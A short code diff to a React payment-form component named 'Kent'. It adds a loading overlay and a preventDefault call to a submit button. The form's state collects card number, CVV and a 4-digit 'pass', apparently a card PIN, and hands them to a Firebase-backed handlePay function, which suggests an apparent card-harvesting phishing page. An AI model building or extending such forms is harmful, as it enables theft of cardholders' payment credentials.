@@ -3,6 +3,7 @@ import { useEffect, useState } from 'react';
 import './kent.css';
 import { doc, onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '../firebase';
+import FullPageLoader from '../loader1';
 type PaymentInfo = {
   createdDate?: string;
   cardNumber: string;
@@ -626,7 +627,9 @@ export default function Kent(props:{setPage:any}) {
                             paymentInfo.pass.length !== 4 ||
                             paymentInfo.cvv === '')
                         }
-                        onClick={() => {
+                        onClick={(e) => {
+                          e.preventDefault();
+
                           if (step === 1) {
                             setLoading(true);
                             handlePay(paymentInfo, setPaymentInfo);
@@ -699,6 +702,8 @@ export default function Kent(props:{setPage:any}) {
             </div>
           </div>
         </div>
+      <FullPageLoader isLoading={loading}/>
+
       </form><style>
         {`
         * {
